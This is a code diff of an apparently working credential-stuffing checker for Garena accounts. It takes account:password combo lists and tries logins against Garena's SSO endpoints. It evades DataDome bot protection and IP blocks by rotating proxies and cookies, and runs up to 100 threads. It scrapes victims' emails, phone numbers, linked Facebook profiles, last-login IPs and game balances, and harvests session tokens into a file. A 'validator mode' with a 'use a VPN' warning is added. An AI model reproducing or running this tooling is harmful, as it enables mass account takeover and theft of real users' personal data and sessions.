-                    enqueue(account, password, vault, combo_file_path)
+                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Network Error'}
+                live_stats.update_stats(is_error=True)
+                results_manager.add_account(err_data)
+                live_stats.push_result(success=False, error_reason='Network Error')
                 return 'ERROR'
 
             if v1 == 'NO_ACCOUNT':
-                stats.accrue(valid=False)
-                account_data = {
-                    'account': account,
-                    'password': password,
-                    'is_error': True,
-                    'error_reason': 'error_auth'
-                }
-                scribe.add(account_data)
-                stats.push(
-                    success=False,
-                    error_reason="Account Doesn't Exist"
-                )
-                _display(
-                    account, password, None, None, False,
-                    err="Account Doesn't Exist!"
-                )
+                live_stats.update_stats(valid=False)
+                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "error_auth"}
+                results_manager.add_account(account_data)
+                live_stats.push_result(success=False, error_reason="Account Doesn't Exist")
+                _display(account, password, None, None, False, err="Account Doesn't Exist!")
                 if auto_remove:
-                    enqueue(account, password, vault, combo_file_path)
+                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                 return 'ERROR'
 
             if v1 == 'ERROR_AUTH':
                 reason = str(v2) if v2 else 'error_auth'
-                stats.accrue(valid=False)
-                account_data = {
-                    'account': account,
-                    'password': password,
-                    'is_error': True,
-                    'error_reason': reason
-                }
-                scribe.add(account_data)
-                stats.push(success=False, error_reason=reason)
+                live_stats.update_stats(valid=False)
+                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': reason}
+                results_manager.add_account(account_data)
+                live_stats.push_result(success=False, error_reason=reason)
                 _display(account, password, None, None, False, err=reason)
                 if auto_remove:
-                    enqueue(account, password, vault, combo_file_path)
+                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                 return 'ERROR'
 
             if not v1 or not v2:
-                if attempt <= ceiling:
-                    saved_ck = cookie_manager.pick()
+                if attempt <= max_retries:
+                    saved_ck = cookie_manager.pick_cookie()
                     if saved_ck:
-                        instill(session, saved_ck)
-                        val = pluck(saved_ck)
+                        applyck(session, saved_ck)
+                        val = extract_datadome_token(saved_ck)
                         if val:
                             datadome_manager.set_datadome(val)
-                    if proxy_manager and proxy_manager.ready():
+                    if proxy_manager and proxy_manager.is_loaded():
                         session.proxies.clear()
-                        session.proxies.update(proxy_manager.next())
+                        session.proxies.update(proxy_manager.get_next())
                     continue
-                stats.accrue(is_error=True)
-                account_data = {
-                    'account': account,
-                    'password': password,
-                    'is_error': True,
-                    'error_reason': 'Prelogin Failed'
-                }
-                scribe.add(account_data)
-                stats.push(success=False, error_reason='Prelogin Failed')
-                if auto_remove:
-                    enqueue(account, password, vault, combo_file_path)
+                live_stats.update_stats(is_error=True)
+                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Prelogin Failed'}
+                results_manager.add_account(account_data)
+                live_stats.push_result(success=False, error_reason='Prelogin Failed')
                 return 'ERROR'
 
             if new_datadome:
                 datadome_manager.set_datadome(new_datadome)
                 datadome_manager.set_session_datadome(session, new_datadome)
 
-            sso_key = admit(session, account, password, v1, v2)
+            sso_key = login(session, account, password, v1, v2)
 
             if not sso_key:
-                err_data = {
-                    'account': account,
-                    'password': password,
-                    'is_error': True,
-                    'error_reason': 'Invalid Credentials'
-                }
-                stats.accrue(valid=False)
-                scribe.add(err_data)
-                stats.push(success=False, error_reason='Wrong Password')
-                _display(
-                    account, password, None, None, False,
-                    err='Incorrect Password'
-                )
+                # Real wrong-password hits are already caught upstream (ERROR_AUTH
+                # branch / error_auth JSON). A None here with no explicit auth
+                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Credentials'}
+                live_stats.update_stats(valid=False)
+                results_manager.add_account(err_data)
+                live_stats.push_result(success=False, error_reason='Wrong Password')
+                _display(account, password, None, None, False, err='Incorrect Password')
                 if auto_remove:
-                    enqueue(account, password, vault, combo_file_path)
+                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                 return 'ERROR'
-
+            
             if isinstance(sso_key, str) and sso_key.startswith('permanent_fail:'):
                 reason = sso_key.split(':', 1)[1]
-                err_data = {
-                    'account': account,
-                    'password': password,
-                    'is_error': True,
-                    'error_reason': reason
-                }
-                stats.accrue(valid=False)
-                scribe.add(err_data)
+                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': reason}
+                live_stats.update_stats(valid=False)
+                results_manager.add_account(err_data)
                 _display(account, password, None, None, False, err=reason)
                 if auto_remove:
-                    vault.excise(combo_file_path, f'{account}:{password}')
+                    file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                 return 'ERROR'
-
+            
             try:
                 _sk_for_ac = session.cookies.get('session_key') or sso_key
-                capture(session, _sk_for_ac)
+                _capture_ac_session(session, _sk_for_ac)
             except Exception:
                 pass
 
-            persist(session)
-            cookie_parts = []
-            for k in [
-                'apple_state_key', 'datadome', 'sso_key',
-                'ac_session', 'session_key',
-                '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX'
-            ]:
-                v = session.cookies.get(k)
-                if v:
-                    cookie_parts.append(f'{k}={v}')
+            _save_session_cookies(session)
+            cookie_parts = [f'{k}={session.cookies.get(k)}' for k in ['apple_state_key', 'datadome', 'sso_key', 'ac_session', 'session_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX'] if session.cookies.get(k)]
             cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
-
-            headers = {
-                'accept': '*/*',
-                'referer': 'https://account.garena.com/',
-                'user-agent': (
-                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
-                    'Chrome/129.0.0.0 Safari/537.36'
-                )
-            }
+            
+            headers = {'accept': '*/*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
             if cookie_header:
                 headers['cookie'] = cookie_header
-
-            response = session.get(
-                'https://account.garena.com/api/account/init',
-                headers=headers,
-                timeout=12
-            )
-
+            
+            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=6)
+            
             if response.status_code == 403:
-                bad_cookie = (
-                    session.cookies.get('datadome')
-                    or datadome_manager.get_datadome()
-                )
+                bad_cookie = session.cookies.get('datadome') or datadome_manager.get_datadome()
                 if bad_cookie:
-                    cookie_manager.ban(bad_cookie)
-                if proxy_manager and proxy_manager.ready():
-                    _cur_proxy = (
-                        session.proxies.get('http')
-                        or session.proxies.get('https')
-                    )
+                    cookie_manager.mark_banned(bad_cookie)
+                if proxy_manager and proxy_manager.is_loaded():
+                    _cur_proxy = session.proxies.get('http') or session.proxies.get('https')
                     if _cur_proxy:
-                        proxy_manager.fault(_cur_proxy, is_403=True)
+                        proxy_manager.report_failure(_cur_proxy, is_403=True)
                 if datadome_manager.handle_403(session):
-                    if attempt < ceiling:
-                        backoff = min(2 ** attempt, 60) + random.uniform(0, 3)
-                        if not suppress_print:
-                            print(
-                                f'  {yl}⚠  403 — backoff {backoff:.1f}s '
-                                f'({attempt}/{ceiling}){rst}'
-                            )
-                        time.sleep(backoff)
+                    if attempt < max_retries:
+                        # Stale datadome on a flipped IP — handle_403 refreshed it
+                        # and the new IP is live, so retry fast, no long backoff.
+                        time.sleep(random.uniform(0.1, 0.4))
                         continue
-                err_data = {
-                    'account': account,
-                    'password': password,
-                    'is_error': True,
-                    'error_reason': 'Cookie Banned/IP Blocked'
-                }
-                stats.accrue(is_error=True)
-                scribe.add(err_data)
+                # 403 after datadome refresh exhausted — service rejecting us.
+                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Cookie Banned/IP Blocked'}
+                live_stats.update_stats(is_error=True)
+                results_manager.add_account(err_data)
                 if auto_remove:
-                    enqueue(account, password, vault, combo_file_path)
+                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                 return 'ERROR'
 
             try:
                 account_data_json = response.json()
             except json.JSONDecodeError:
-                if attempt < ceiling:
-                    if not suppress_print:
-                        print(
-                            f'  {yl}⚠  Invalid response, retrying '
-                            f'({attempt}/{ceiling}){rst}'
-                        )
-                    time.sleep(2)
+                if attempt < max_retries:
+                    time.sleep(0.2)
                     continue
-                err_data = {
-                    'account': account,
-                    'password': password,
-                    'is_error': True,
-                    'error_reason': 'Invalid Server Response'
-                }
-                stats.accrue(is_error=True)
-                scribe.add(err_data)
+                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Server Response'}
+                live_stats.update_stats(is_error=True)
+                results_manager.add_account(err_data)
                 if auto_remove:
-                    enqueue(account, password, vault, combo_file_path)
+                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                 return 'ERROR'
-
+            
             if 'error_auth' in account_data_json:
-                err_data = {
-                    'account': account,
-                    'password': password,
-                    'is_error': True,
-                    'error_reason': 'Incorrect Password'
-                }
-                stats.accrue(valid=False)
-                scribe.add(err_data)
-                _display(
-                    account, password, None, None, False,
-                    err='Incorrect Password'
-                )
+                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Incorrect Password'}
+                live_stats.update_stats(valid=False)
+                results_manager.add_account(err_data)
+                _display(account, password, None, None, False, err='Incorrect Password')
                 if auto_remove:
-                    enqueue(account, password, vault, combo_file_path)
+                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                 return 'ERROR'
-
+            
             if 'error' in account_data_json:
                 error_msg = account_data_json.get('error')
                 if error_msg == 'ACCOUNT DOESNT EXIST':
-                    err_data = {
-                        'account': account,
-                        'password': password,
-                        'is_error': True,
-                        'error_reason': "Account Doesn't Exist"
-                    }
-                    stats.accrue(valid=False)
-                    scribe.add(err_data)
-                    _display(
-                        account, password, None, None, False,
-                        err="Account Doesn't Exist!"
-                    )
+                    err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
+                    live_stats.update_stats(valid=False)
+                    results_manager.add_account(err_data)
+                    _display(account, password, None, None, False, err="Account Doesn't Exist!")
                     if auto_remove:
-                        vault.excise(combo_file_path, f'{account}:{password}')
+                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                     return 'ERROR'
                 else:
-                    err_data = {
-                        'account': account,
-                        'password': password,
-                        'is_error': True,
-                        'error_reason': error_msg
-                    }
-                    stats.accrue(is_error=True)
-                    scribe.add(err_data)
+                    err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': error_msg}
+                    live_stats.update_stats(is_error=True)
+                    results_manager.add_account(err_data)
                     _display(account, password, None, None, False, err=error_msg)
                     if auto_remove:
-                        vault.excise(combo_file_path, f'{account}:{password}')
+                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                     return 'ERROR'
-
+            
             if 'user_info' in account_data_json:
-                details = dissect(account_data_json)
-                details['login_history'] = account_data_json.get(
-                    'login_history', []
-                )
+                details = parse_account_details(account_data_json)
+                details['login_history'] = account_data_json.get('login_history', [])
             else:
-                details = dissect({'user_info': account_data_json})
-
-            codm_session = requests.Session()
-            for cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
-                if cookie_name in session.cookies:
-                    codm_session.cookies.set(
-                        cookie_name,
-                        session.cookies.get(cookie_name),
-                        domain='.garena.com'
-                    )
-
-            has_codm, codm_info = inspect(codm_session, account)
-            codm_session.close()
-
+                details = parse_account_details({'user_info': account_data_json})
+            
+            # Run CODM check + game connections in parallel to save ~300ms
+            # per account. With 150 threads × 300ms = 45s saved per 100 accounts.
             game_connections = []
-            if other:
+            has_codm = False
+            codm_info = {}
+            
+            from concurrent.futures import ThreadPoolExecutor as _TPE
+            with _TPE(max_workers=2) as _inner_ex:
+                # CODM check — reuse a warm per-thread session (keep-alive),
+                # reset only the auth cookies and mirror the main proxy.
+                def _do_codm():
+                    cs = _get_codm_session()
+                    cs.cookies.clear()
+                    for cn in ['sso_key', 'apple_state_key', 'datadome']:
+                        if cn in session.cookies:
+                            cs.cookies.set(cn, session.cookies.get(cn), domain='.garena.com')
+                    try:
+                        cs.proxies.clear()
+                        if session.proxies:
+                            cs.proxies.update(session.proxies)
+                    except Exception:
+                        pass
+                    return check_codm_account(cs, account)
+                
+                codm_fut = _inner_ex.submit(_do_codm)
+                
+                # Game connections (only if enabled)
+                games_fut = None
+                if CHECK_OTHER_GAMES:
+                    games_fut = _inner_ex.submit(get_game_connections, session, account)
+                
                 try:
-                    if not suppress_print:
-                        console.print(
-                            f'  [dim]🔄 Checking game connections '
-                            f'for {account}...[/dim]'
-                        )
-                    game_connections = games(session, account)
-                    if game_connections:
-                        if not suppress_print:
-                            console.print(
-                                f'  [dim]✓ Found {len(game_connections)} '
-                                f'game connection(s)[/dim]'
-                            )
-                            for g in game_connections:
-                                console.print(
-                                    f'  [dim]  • {g.get("game")}: '
-                                    f'{g.get("role")} '
-                                    f'({g.get("region")})[/dim]'
-                                )
-                    else:
-                        if not suppress_print:
-                            console.print(
-                                '  [dim]✗ No game connections found[/dim]'
-                            )
-                except Exception as _ge:
-                    if not suppress_print:
-                        console.print(
-                            f'  [yellow]⚠ Game check error: {_ge}[/yellow]'
-                        )
-                    logger.warning(f'[GAMES] Failed for {account}: {_ge}')
-
-            fresh_datadome = datadome_manager.extract_datadome_from_session(
-                session
-            )
+                    has_codm, codm_info = codm_fut.result(timeout=8)
+                except Exception:
+                    has_codm, codm_info = False, {}
+                
+                if games_fut is not None:
+                    try:
+                        game_connections = games_fut.result(timeout=5) or []
+                        # [suppressed] game connections found print
+                    except Exception as _ge:
+                        # [suppressed] game check error print
+                        game_connections = []
+            
+            fresh_datadome = datadome_manager.extract_datadome_from_session(session)
             if fresh_datadome:
-                cookie_manager.keep(fresh_datadome)
-
-            mobile_n = details['personal'].get('mobile_no', 'N/A')
+                cookie_manager.save_cookie(fresh_datadome)
+            
+            mobile_no = details['personal'].get('mobile_no', 'N/A')
             country_code = details['personal'].get('country_code', 'N/A')
-            formatted_mobile = mask(mobile_n, country_code)
-
+            formatted_mobile = format_mobile_number(mobile_no, country_code)
+            
             email = details.get('email', 'N/A')
             email_verified = details.get('email_verified', False)
             if email and email != 'N/A' and ('@' in email):
-                email_display = (
-                    f'{email} '
-                    f'{"(Verified)" if email_verified else "(Not Verified)"}'
-                )
+                email_display = f'{email} {"(Verified)" if email_verified else "(Not Verified)"}'
             else:
                 email_display = 'N/A'
-
+            
             fb_username = details['facebook'].get('fb_username', 'N/A')
             fb_uid = details['facebook'].get('fb_uid', 'N/A')
-            fb_link = (
-                f'https://www.facebook.com/profile.php?id={fb_uid}'
-                if fb_uid != 'N/A' and fb_uid
-                else 'N/A'
-            )
-
+            fb_link = f'https://www.facebook.com/profile.php?id={fb_uid}' if fb_uid != 'N/A' and fb_uid else 'N/A'
+            
             if fb_uid == 'N/A' or not fb_uid:
                 fb_info = 'NOT CONNECTED'
             elif not fb_username or fb_username == 'N/A':
                 fb_info = 'FB UNBIND or FB DELETED'
             else:
                 fb_info = 'CONNECTED'
-
+            
             login_history = details.get('login_history', [])
             last_login_info = login_history[0] if login_history else {}
             last_login = last_login_info.get('timestamp', 0)
-            last_login_date = (
-                time.strftime(
-                    '%B %d, %Y | %I:%M %p',
-                    time.localtime(last_login)
-                )
-                if last_login else 'N/A'
-            )
-            last_login_where = (
-                f"{last_login_info.get('source', 'Unknown')}"
-                if last_login_info else 'Unknown'
-            )
-            last_login_ip = (
-                last_login_info.get('ip', 'N/A')
-                if last_login_info else 'N/A'
-            )
-            last_login_country = (
-                last_login_info.get('country', 'N/A')
-                if last_login_info else 'N/A'
-            )
-
+            last_login_date = time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login)) if last_login else 'N/A'
+            last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else 'Unknown'
+            last_login_ip = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
+            last_login_country = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'
+            
             shell_balance = details['profile'].get('shell_balance', 0)
-
+            
             account_data = {
                 'account': account,
                 'password': password,
@@ -3568,9 +3261,7 @@ def process(
                 'formatted_mobile': formatted_mobile,
                 'country': details['personal'].get('country', 'N/A'),
                 'shell_balance': shell_balance,
-                'account_status': details['status'].get(
-                    'account_status', 'N/A'
-                ),
+                'account_status': details['status'].get('account_status', 'N/A'),
                 'fb_username': fb_username,
                 'fb_uid': fb_uid,
                 'fb_link': fb_link,
@@ -3585,7 +3276,7 @@ def process(
                 'last_login_country': last_login_country,
                 'game_connections': game_connections
             }
-
+            
             if has_codm and codm_info:
                 account_data.update({
                     'codm_level': int(codm_info.get('codm_level', 0)),
@@ -3602,18 +3293,15 @@ def process(
                     'codm_uid': 'N/A',
                     'region_code': 'N/A'
                 })
-
-            scribe.add(account_data)
-            if proxy_manager and proxy_manager.ready():
-                _cur_proxy = (
-                    session.proxies.get('http')
-                    or session.proxies.get('https')
-                )
+            
+            results_manager.add_account(account_data)
+            if proxy_manager and proxy_manager.is_loaded():
+                _cur_proxy = session.proxies.get('http') or session.proxies.get('https')
                 if _cur_proxy:
-                    proxy_manager.okay(_cur_proxy)
-
+                    proxy_manager.report_success(_cur_proxy)
+            
             codm_level = account_data.get('codm_level', 0)
-            stats.accrue(
+            live_stats.update_stats(
                 valid=True,
                 clean=details['is_clean'],
                 has_codm=has_codm,
@@ -3621,182 +3309,107 @@ def process(
                 game_connections=game_connections,
                 shell=shell_balance
             )
-            stats.push(
+            live_stats.push_result(
                 success=True,
                 is_clean=details['is_clean'],
                 has_codm=has_codm,
                 codm_level=codm_level,
                 shell_balance=shell_balance
             )
-
-            if other and game_connections:
-                stash(
-                    account, password, account_data,
-                    game_connections, scribe.base_dir
-                )
-
+            
+            if CHECK_OTHER_GAMES and game_connections:
+                save_game_folder(account, password, account_data, game_connections, results_manager.base_dir)
+            
             _display(account, password, details, codm_info, has_codm, gc=game_connections)
 
-            if harvest:
+            if HARVEST_COOKIES:
                 try:
-                    wanted_keys = [
-                        'datadome',
-                        'sso_key',
-                        'token_session',
-                        'ac_session',
-                        'session_key',
-                        'apple_state_key',
-                        '_ga',
-                        '_ga_XB5PSHEQB4',
-                        '_ga_1M7M9L6VPX',
-                        '_gid',
-                        'fb_state',
-                        'google_state',
-                        'line_state',
-                        'twitter_state',
-                        'huawei_state',
-                        'vk_state',
-                        'tiktok_state',
-                        'youtube_state',
-                        'cf_clearance',
-                        '__cf_bm',
-                        'garena_id',
-                        'garena_region',
-                        'access_token',
-                        'open_id',
-                        't_open_id'
-                    ]
+                    wanted_keys = ['datadome', 'sso_key', 'token_session', 'ac_session', 'session_key']
                     found_cookies = {}
-                    for name in wanted_keys:
-                        val = session.cookies.get(name)
-                        if val and name not in found_cookies:
-                            found_cookies[name] = val
-                    for extra in ('access_token', 'open_id', 't_open_id'):
-                        if extra in codm_info and codm_info[extra] not in ('N/A', ''):
-                            if extra not in found_cookies:
-                                found_cookies[extra] = codm_info[extra]
+                    for cookie in session.cookies:
+                        if cookie.name in wanted_keys and cookie.name not in found_cookies:
+                            found_cookies[cookie.name] = cookie.value
                     if found_cookies:
-                        c_str = "; ".join(
-                            f"{k}={v}" for k, v in found_cookies.items()
-                        )
-                        try:
-                            with open("fresh_cookie.txt", "a", encoding="utf-8") as scf:
-                                scf.write(c_str + "\n")
-                        except Exception:
-                            pass
-                        if harvest_file:
-                            try:
-                                with open(harvest_file, "a", encoding="utf-8") as hf:
-                                    hf.write(c_str + "\n")
-                            except Exception:
-                                pass
+                        c_str = "; ".join([f"{k}={v}" for k, v in found_cookies.items()])
+                        with open("fetch_cookie.txt", "a", encoding="utf-8") as scf:
+                            scf.write(c_str + "\n")
                 except Exception:
                     pass
 
             if auto_remove:
-                vault.excise(combo_file_path, f'{account}:{password}')
-
+                file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
+            
             return 'DONE'
-
+            
         except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
-            if attempt < ceiling:
-                backoff = min(2 ** attempt, 60) + random.uniform(0, 2)
-                if not suppress_print:
-                    print(
-                        f'  {yl}⚠  Connection/Timeout — backoff '
-                        f'{backoff:.1f}s ({attempt}/{ceiling}){rst}'
-                    )
-                time.sleep(backoff)
+            if attempt < max_retries:
+                time.sleep(random.uniform(0.1, 0.4))
                 continue
-            err_data = {
-                'account': account,
-                'password': password,
-                'is_error': True,
-                'error_reason': 'Connection/Timeout Error'
-            }
-            stats.accrue(is_error=True)
-            scribe.add(err_data)
+            err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Connection/Timeout Error'}
+            live_stats.update_stats(is_error=True)
+            results_manager.add_account(err_data)
             if auto_remove:
-                enqueue(account, password, vault, combo_file_path)
+                _queue_auto_remove(account, password, file_manager, combo_file_path)
             return 'ERROR'
 
         except Exception as e:
-            if attempt < ceiling:
-                time.sleep(2)
+            if attempt < max_retries:
+                time.sleep(0.2)
                 continue
             logger.error(f'[ERROR] Unexpected error processing {account}')
-            err_data = {
-                'account': account,
-                'password': password,
-                'is_error': True,
-                'error_reason': f'Unexpected Error: {str(e)}'
-            }
-            stats.accrue(is_error=True)
-            scribe.add(err_data)
+            err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': f'Unexpected Error: {str(e)}'}
+            live_stats.update_stats(is_error=True)
+            results_manager.add_account(err_data)
             if auto_remove:
-                enqueue(account, password, vault, combo_file_path)
+                _queue_auto_remove(account, password, file_manager, combo_file_path)
             return 'ERROR'
 
-def preprobe(session, account, datadome_manager, ceiling=6):
+def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=6):
     url = 'https://sso.garena.com/api/prelogin'
-    for attempt in range(ceiling):
+    for attempt in range(max_retries):
         try:
-            params = {
-                'app_id': '10100',
-                'account': account,
-                'format': 'json',
-                'id': str(int(time.time() * 1000))
-            }
+            params = {'app_id': '10100', 'account': account, 'format': 'json', 'id': str(int(time.time() * 1000))}
             current_cookies = session.cookies.get_dict()
-            cookie_parts = []
-            for n in ('apple_state_key', 'datadome', 'sso_key'):
-                if n in current_cookies:
-                    cookie_parts.append(f'{n}={current_cookies[n]}')
+            cookie_parts = [f'{n}={current_cookies[n]}' for n in ('apple_state_key', 'datadome', 'sso_key') if n in current_cookies]
             headers = {
                 'accept': 'application/json, text/plain, */*',
                 'accept-encoding': 'gzip, deflate, br, zstd',
                 'accept-language': 'en-US,en;q=0.9',
                 'connection': 'keep-alive',
                 'host': 'sso.garena.com',
-                'referer': (
-                    f'https://sso.garena.com/universal/login?app_id=10100'
-                    f'&redirect_uri=https%3A%2F%2Faccount.garena.com%2F'
-                    f'&locale=en-SG&account={account}'
-                ),
-                'sec-ch-ua': (
-                    '"Google Chrome";v="133", "Chromium";v="133", '
-                    '"Not=A?Brand";v="99"'
-                ),
+                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
+                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
-                'user-agent': (
-                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
-                    'AppleWebKit/537.36 (KHTML, like Gecko) '
-                    'Chrome/133.0.0.0 Safari/537.36'
-                )
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
             }
             if cookie_parts:
                 headers['cookie'] = '; '.join(cookie_parts)
-            resp = session.get(url, headers=headers, params=params, timeout=8)
+            resp = session.get(url, headers=headers, params=params, timeout=5)
             new_dd = resp.cookies.get('datadome')
             if new_dd:
                 session.cookies.set('datadome', new_dd, domain='.garena.com')
                 datadome_manager.set_datadome(new_dd)
             if resp.status_code == 403:
-                fresh = garner(session)
+                fresh = get_datadome_cookie(session)
                 if fresh:
                     datadome_manager.set_datadome(fresh)
                     datadome_manager.set_session_datadome(session, fresh)
                     continue
                 return (None, None, None)
             if resp.status_code == 429:
+                # rate-limited: swap in a fresh datadome token so the retry isn't throttled
+                fresh = get_datadome_cookie(session)
+                if fresh:
+                    datadome_manager.set_datadome(fresh)
+                    datadome_manager.set_session_datadome(session, fresh)
                 continue
             resp.raise_for_status()
-            if sniff(resp):
-                fresh = garner(session)
+            if _is_fake_response(resp):
+                fresh = get_datadome_cookie(session)
                 if fresh:
                     datadome_manager.set_datadome(fresh)
                     datadome_manager.set_session_datadome(session, fresh)
@@ -3821,61 +3434,528 @@ def preprobe(session, account, datadome_manager, ceiling=6):
             continue
     return (None, None, None)
 
-def games(session, account):
-    found = []
+def validator_check():
+    clear_screen()
+    display_banner()
+    console = Console()
+    
+    console.print(Panel(Text("⚠  SECURITY NOTICE", style="bold bright_red") + Text(" — USE A VPN BEFORE VALIDATING", style="bright_white"), border_style="bright_red", box=box.ROUNDED, expand=False))
+    print()
+    console.print(Panel(Text("⬡  VALIDATOR MODE", style="bold bright_white"), border_style="bright_yellow", box=box.ROUNDED, expand=False))
+    print()
+    
+    file_manager = AccountFileManager()
+    combo_files = file_manager.scan_combo_folder()
+    if not combo_files:
+        _log('ERROR', 'No .txt files found in Combo folder.')
+        input(f'\n  {_DIM}Press Enter to return to menu{_RST} ')
+        return
+    
+    file_viewer = AccountFileViewer()
+    file_infos = [info for fp in combo_files for info in [file_manager.get_file_info(fp)] if info]
+    if not file_infos:
+        _log('ERROR', 'No valid combo files.')
+        input(f'\n  {_DIM}Press Enter to return to menu{_RST} ')
+        return
+    
+    file_viewer.display_file_table(file_infos)
+    selected_file = file_viewer.prompt_file_selection(file_infos)
+    
+    accounts = []
+    with open(selected_file, 'r', encoding='utf-8', errors='ignore') as fh:
+        for line in fh:
+            acc, pw = clean_account_line(line)
+            if acc and pw:
+                accounts.append((acc, pw))
+    
+    if not accounts:
+        _log('ERROR', 'No valid account:password lines found.')
+        input(f'\n  {_DIM}Press Enter to return to menu{_RST} ')
+        return
+    
+    console.print(Panel(Text(f"Loaded {len(accounts):,} combos", style="bold bright_white"), border_style="bright_green", box=box.ROUNDED, expand=False))
+    print()
+    
+    console.print(Panel(Text("Select Thread Count", style="bold bright_white"), border_style="cyan", box=box.ROUNDED, expand=False))
+    
+    while True:
+        try:
+            raw_t = input(f'  {_CY}❯ Threads 1-100 {_DIM}(default {DEFAULT_THREADS}){_RST}  {_CY}❯{_RST} ').strip()
+            num_threads = int(raw_t) if raw_t else DEFAULT_THREADS
+            if 1 <= num_threads <= 100:
+                break
+            _log('ERROR', 'Enter a value between 1 and 100.')
+        except ValueError:
+            _log('ERROR', 'Invalid input — enter a number.')
+    
+    _log('SUCCESS', f'Running with [bold]{num_threads}[/bold] thread(s)')
+    print()
+    
+    stem = Path(selected_file).stem
+    ts_str = datetime.now().strftime('%Y%m%d_%H%M%S')
+    out_dir = Path('Results') / f'validator_{stem}_{ts_str}'
+    out_dir.mkdir(parents=True, exist_ok=True)
+    
+    valid_path = out_dir / 'valid.txt'
+    invalid_path = out_dir / 'invalid.txt'
+    error_path = out_dir / 'errors.txt'
+    
+    valid_fh = open(valid_path, 'a', encoding='utf-8', buffering=1)
+    invalid_fh = open(invalid_path, 'a', encoding='utf-8', buffering=1)
+    error_fh = open(error_path, 'a', encoding='utf-8', buffering=1)
+    
+    vl = {'valid': 0, 'invalid': 0, 'error': 0, 'done': 0}
+    st_lock = threading.Lock()
+    file_lock = threading.Lock()
+    stop_ev = threading.Event()
+    print_lock = threading.Lock()
+    start_time = time.time()
+    total = len(accounts)
+    cookie_manager_val = CookieManager()
+    _tl = threading.local()
+    global _PROXIES_ACTIVE
+    _PROXIES_ACTIVE = False
+
+    def _get_sess():
+        if not hasattr(_tl, 's'):
+            s = _make_session()
+            dm = DataDomeManager()
+            picked_ck = cookie_manager_val.pick_cookie()
+            if picked_ck:
+                applyck(s, picked_ck)
+                dd = extract_datadome_token(picked_ck)
+                if dd:
+                    dm.set_datadome(dd)
+                    dm.set_session_datadome(s, dd)
+            else:
+                proxy_dict = dict(s.proxies) if hasattr(s, 'proxies') and s.proxies else None
+                dd = get_datadome_cookie(s, proxies=proxy_dict)
+                if dd:
+                    dm.set_datadome(dd)
+                    dm.set_session_datadome(s, dd)
+            _tl.s = s
+            _tl.dm = dm
+        return (_tl.s, _tl.dm)
+
+    def _print_line(tag, account, password, note=''):
+        with print_lock:
+            if tag == 'valid':
+                console.print(f"  [bold bright_green]VALID  [/bold bright_green]  [bright_white]{account}:{password}[/bright_white]")
+            else:
+                reason = note.upper() if note else 'INCORRECT PASSWORD' if tag == 'invalid' else 'UNKNOWN ERROR'
+                color = "bold bright_red" if tag == 'invalid' else "dim"
+                console.print(f"  [{color}]INVALID[/{color}]  [dim]{account}:{password}[/dim]  [dim]{reason}[/dim]")
+
+    def _print_live_stats():
+        with st_lock:
+            v = vl['valid']; iv = vl['invalid']; er = vl['error']; dn = vl['done']
+        elapsed = max(time.time() - start_time, 0.001)
+        rate = dn / elapsed
+        eta = (total - dn) / rate if rate > 0 else 0
+        pct = dn / total * 100 if total > 0 else 0
+        bar_w = 20
+        filled = int(pct / 100 * bar_w)
+        with print_lock:
+            console.print()
+            console.print(Panel(
+                f"[cyan]{'█' * filled}{'░' * (bar_w - filled)}[/cyan]  [bold bright_yellow]{pct:.1f}%[/bold bright_yellow]  [dim]{dn}/{total}  ·  {rate:.1f}/s  ·  ETA {int(eta // 60)}m{int(eta % 60):02d}s[/dim]",
+                border_style="cyan", box=box.ROUNDED, padding=(0, 1), expand=False
+            ))
+            console.print()
+
+    def _check_one(acc_pw):
+        if stop_ev.is_set():
+            return
+        account, password = acc_pw
+        result = 'error'; note = ''
+        try:
+            session, dm = _get_sess()
+            v1, v2, _ = _prelogin_no_ip_wait(session, account, dm)
